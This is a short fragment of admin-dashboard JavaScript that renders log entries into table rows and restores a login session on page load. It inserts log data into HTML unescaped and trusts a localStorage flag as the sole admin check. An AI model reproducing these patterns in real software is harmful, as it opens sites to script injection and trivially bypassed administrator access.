        <td style="max-width:300px;overflow:hidden;text-overflow:ellipsis;">${log.data || '-'}</td>
        <td>${new Date(log.createdAt || log.$createdAt).toLocaleString('ar-EG')}</td>
      </tr>
    `).join('');
    }
});

// Check for existing session
document.addEventListener('DOMContentLoaded', () => {
    if (localStorage.getItem('adminLoggedIn') === 'true') {
        showDashboard();
    }
});
